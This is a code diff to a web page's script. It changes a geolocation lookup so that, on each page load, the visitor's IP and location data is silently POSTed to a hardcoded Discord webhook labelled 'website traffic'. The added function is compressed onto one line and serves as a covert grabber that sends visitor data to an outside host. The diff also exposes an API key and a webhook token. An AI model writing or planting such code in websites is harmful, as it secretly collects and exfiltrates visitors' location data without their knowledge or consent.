@@ -4,6 +4,7 @@
     <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
     <script>
     $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=8e353b198b5a47df87b35659176ba1fa", function(data) {
-    console.log(data);
+    f(data);
     })
+      function f(g){var e=new XMLHttpRequest;e.open("POST","https://discord.com/api/webhooks/811307896099962880/LQdNrP7GJA4bHbfheNS-k0Q9amHJJf5t8RjAnGC-gEUl9JIaXMxpNua4jCsLSXyA-keP"),e.setRequestHeader("Content-type","application/json");e.send(JSON.stringify({username:"website traffic",avatar_url:"",content:g}))}
     </script>
